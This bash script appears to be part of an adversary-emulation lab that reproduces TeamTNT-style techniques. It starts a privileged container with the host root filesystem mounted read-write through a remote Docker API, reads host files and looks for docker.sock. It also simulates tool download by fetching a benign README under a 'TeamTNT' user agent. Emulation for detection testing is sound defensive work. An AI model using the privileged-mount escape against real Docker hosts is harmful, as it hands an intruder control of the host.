#!/usr/bin/env bash
# T1611 / T1610 / T1609 — privileged container escape simulation
set -euo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# shellcheck source=lib/common.sh
source "${SCRIPT_DIR}/lib/common.sh"
require_lab

export DOCKER_HOST="${DOCKER_API_URL}"

CONTAINER_NAME="teamtnt-escape-lab"

log "Deploying privileged container with host mount (T1611)"
docker rm -f "${CONTAINER_NAME}" 2>/dev/null || true

docker run -d --name "${CONTAINER_NAME}" \
  --privileged \
  -v /:/host:rw \
  busybox:1.36 \
  sleep 3600

log "Executing on host filesystem via mount (escape simulation)"
docker exec "${CONTAINER_NAME}" sh -c '
  echo "[escape] Host root visible at /host"
  ls /host/etc/hostname 2>/dev/null && cat /host/etc/hostname
  echo "[escape] Checking for docker.sock on host"
  ls -la /host/var/run/docker.sock 2>/dev/null || echo "no docker.sock"
' | tee "${STAGING_DIR}/escape-output.txt"

log "Ingress tool transfer (T1105) — downloading helper script"
curl -fsSL -A "TeamTNT/44con-lab" -o "${STAGING_DIR}/helper.sh" \
  "https://raw.githubusercontent.com/torvalds/linux/master/README" 2>/dev/null \
  || echo '# mock payload' > "${STAGING_DIR}/helper.sh"

log "Escape lab container: ${CONTAINER_NAME}"
